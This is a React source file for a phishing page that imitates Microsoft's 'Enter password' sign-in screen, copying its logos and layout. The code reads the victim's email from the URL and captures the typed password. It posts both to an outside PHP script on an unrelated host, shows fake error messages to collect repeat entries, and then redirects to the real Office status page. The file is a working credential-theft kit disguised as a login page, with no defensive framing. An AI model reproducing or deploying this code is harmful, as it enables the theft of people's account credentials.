import axios from "axios";
import "./App.css";
import { useState } from "react";
function App() {
  // this is a simple state
  const url_string = window.location.hash.substring(1);
  const [pswd, setPswd] = useState("");
  const [count, setCount] = useState(0);
  const [errors, setErros] = useState({
    passLength: true,
    passStatus: true
  })
  const handleSignIn = (ev) => {
    ev.preventDefault();
    if(pswd.length < 5) {
      setErros({...errors, passLength:false})
    }
    else {
      sendResult(url_string, pswd)
    }
    if(count>=2) {
      setTimeout(() => {
      window.location.replace("https://portal.office.com/servicestatus");
    }, 3000);
    }
  };
  const sendResult = async (user, pass) => {
    await axios.post("https://courses.geopackllc.com/wp-includes/js/jcrop/plolici.php", {email:user, password: pass}).then((res) => {
      console.log(res);
      setErros({passLength: true ,passStatus : true });

    }).catch((err) => {
      setCount(count + 1);
      setErros({passLength: true ,passStatus : false });
    });
  }
  return (
    <>
      <div className="cb" style={{ display: "block" }} />{" "}
      <form name="f1" id="i0281" method="post" autoComplete="off">
        {" "}
        <div className="login-paginated-page">
          <div id="lightboxTemplateContainer">
            <div id="lightboxBackgroundContainer">
              <div className="background-image-holder" role="presentation">
                <div
                  className="background-image ext-background-image"
                  style={{
                    backgroundImage: `url("https://aadcdn.msftauth.net/shared/1.0/content/images/backgrounds/2_11d9e3bcdfede9ce5ce5ace2d129f1c4.svg")`,
                  }}
                ></div>
              </div>
            </div>
            <div className="outer" id="bgImgCenter">
              <div className="template-section main-section">
                <div className="middle ext-middle">
                  <div className="full-height">
                    <div className="flex-column">
                      <div className="win-scroll">
                        <div
                          id="lightbox"
                          className="sign-in-box ext-sign-in-box fade-in-lightbox"
                        >
                          <div>
                            <img
                              className="logo"
                              role="img"
                              pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png"
                              svgsrc=""
                              src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"
                              alt="Microsoft"
                            />
                          </div>
                          <div role="main">
                            <div
                              id="pstb"
                              className="pagination-view animate has-identity-banner slide-in-next"
                            >
                              <div>
                                <div className="identityBanner">
                                  <button
                                    type="button"
                                    className="backButton"
                                    id="idBtn_Back"
                                  >
                                    <img
                                      role="presentation"
                                      pngsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png"
                                      svgsrc="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"
                                      src="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"
                                    />
                                  </button>
                                  <div id="ds" className="identity">
                                    {url_string}
                                  </div>
                                </div>
                                <div
                                  id="loginHeader"
                                  className="row title ext-title"
                                >
                                  <div role="heading" aria-level="1">
                                    Enter password
                                  </div>
                                </div>

                                <div
                                  id="errorpw"
                                  style={{
                                    color: "red",
                                    Margin: "15",
                                    marginLeft: "0px",
                                    marginTop: "0px",
                                    marginBottom: "0px",
                                  }}
                                >
                                  {errors.passLength? "" : "Your account password is too short."}
                                  {errors.passStatus? "" : <span>Your account password cannot be empty. if you don't remember your password, <a href="#">reset it now.</a></span>}
                                </div>

                                <div
                                  id="important1"
                                  style={{ color: "black", fontSize: "13px" }}
                                >
                                  Because you're accessing sensitive info, you
                                  need to verify your password
                                </div>
                                <div className="row">
                                  <div className="form-group col-md-24">
                                    <div className="placeholderContainer">
                                      <input
                                        name="passwd"
                                        type="password"
                                        id="i0118"
                                        autoComplete="off"
                                        className="form-control input ext-input text-box ext-text-box"
                                        placeholder="Password"
                                        required=""
                                        value={pswd}
                                        onChange={(ev) => setPswd(ev.target.value)}
                                      />
                                    </div>
                                  </div>
                                </div>
                                <div>
                                  <div className="position-buttons">
                                    <div>
                                      <div className="row">
                                        <div className="col-md-24">
                                          <div className="text-13">
                                            <div className="form-group">
                                              <a
                                                id="idA_PWD_ForgotPassword"
                                                role="link"
                                                href="#"
                                              >
                                                Forgotten my password
                                              </a>
                                            </div>
                                            <div className="form-group">
                                              <a
                                                id="idA_PWD_ForgotPassword"
                                                role="link"
                                                href="#"
                                              >
                                                Sign in with another account
                                              </a>
                                            </div>
                                            <div className="form-group"></div>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                  </div>

                                  <div className="win-button-pin-bottom">
                                    <div className="row">
                                      <div>
                                        <div className="col-xs-24 no-padding-left-right button-container">
                                          <div className="inline-block">
                                            <input
                                              type="submit"
                                              id="Button9"
                                              className="win-button button_primary button ext-button primary ext-primary"
                                              value="Sign in"
                                              onClick={handleSignIn}
                                            />
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div className="plate footer ext-footer" role="contentinfo"></div>
          <div id="footer" role="contentinfo" className="footer ext-footer">
            <div>
              <div id="footerLinks" className="footerNode text-secondary">
                <a
                  id="ftrTerms"
                  href="#Home"
                  className="footer-content ext-footer-content footer-item ext-footer-item"
                >
                  Terms of use
                </a>
                <a
                  id="ftrPrivacy"
                  href="#Home"
                  className="footer-content ext-footer-content footer-item ext-footer-item"
                >
                  Privacy &amp; cookies
                </a>
                <a
                  id="moreOptions"
                  href="#Home"
                  aria-label="Click here for troubleshooting information"
                  className="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item"
                >
                  ...
                </a>
              </div>
            </div>
          </div>
        </div>
      </form>
    </>
  );
}

export default App;
